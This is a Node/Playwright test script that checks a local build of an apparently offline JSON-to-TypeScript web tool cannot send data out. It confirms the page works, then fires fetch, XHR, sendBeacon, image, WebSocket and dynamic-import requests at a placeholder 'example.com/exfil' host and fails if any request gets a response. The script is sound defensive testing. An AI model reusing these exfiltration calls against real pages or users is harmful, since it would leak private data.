#!/usr/bin/env node
/**
 * Asserts that a deployed-shape build cannot phone home.
 *
 * The whole product rests on "nothing you paste leaves your machine". That
 * claim is only as good as the weakest future dependency, so this checks it at
 * the browser level: load a real page under the real headers, try every egress
 * primitive, and require that none of them receives a response.
 *
 *   node scripts/verify-egress.mjs http://127.0.0.1:4330/json-to-typescript/
 */
import { chromium } from 'playwright';

const URL_UNDER_TEST = process.argv[2] ?? 'http://127.0.0.1:4330/';
const origin = new URL(URL_UNDER_TEST).origin;

const browser = await chromium.launch({
  executablePath: process.env.CHROMIUM_PATH || undefined,
});
const page = await browser.newPage();

const seen = new Map();
const isExternal = (url) => !url.startsWith(origin);
const key = (r) => r.url() + r.resourceType();

page.on('request', (r) => {
  if (isExternal(r.url())) seen.set(key(r), { url: r.url(), type: r.resourceType(), outcome: 'pending' });
});
page.on('requestfailed', (r) => {
  const e = seen.get(key(r));
  if (e) e.outcome = `blocked (${r.failure()?.errorText ?? 'unknown'})`;
});
page.on('response', (r) => {
  const e = seen.get(r.url() + r.request().resourceType());
  if (e) e.outcome = `RESPONDED ${r.status()}`;
});

await page.goto(URL_UNDER_TEST, { waitUntil: 'networkidle' });

// Confirm the page is actually functional before trusting the negative result:
// a blank page trivially makes no requests.
await page.fill('textarea', '{"probe":1}');
await page.waitForTimeout(500);
const output = (await page.textContent('pre code').catch(() => '')) ?? '';
const functional = output.length > 0 && !/^No |^Nothing/.test(output);

await page.evaluate(async () => {
  const target = 'https://example.com/exfil';
  try { await fetch(`${target}-fetch`); } catch {}
  try { const x = new XMLHttpRequest(); x.open('GET', `${target}-xhr`); x.send(); } catch {}
  try { navigator.sendBeacon(`${target}-beacon`, 'secret'); } catch {}
  try { new Image().src = `${target}-img.png`; } catch {}
  try { new WebSocket('wss://example.com/exfil-ws'); } catch {}
  try { await import(/* @vite-ignore */ `${target}-module.js`); } catch {}
});
await page.waitForTimeout(2000);
await browser.close();

const attempts = [...seen.values()];
for (const a of attempts) console.log(`  ${a.type.padEnd(10)} ${a.outcome.padEnd(38)} ${a.url}`);

const escaped = attempts.filter((a) => a.outcome.startsWith('RESPONDED'));

if (!functional) {
  console.error('FAIL  page produced no output -- a broken page proves nothing about egress');
  process.exit(1);
}
if (escaped.length > 0) {
  console.error(`FAIL  ${escaped.length} request(s) received a response: ${escaped.map((e) => e.url).join(', ')}`);
  process.exit(1);
}
console.log(`\nPASS  page is functional and every egress attempt was blocked (${attempts.length} intercepted)`);
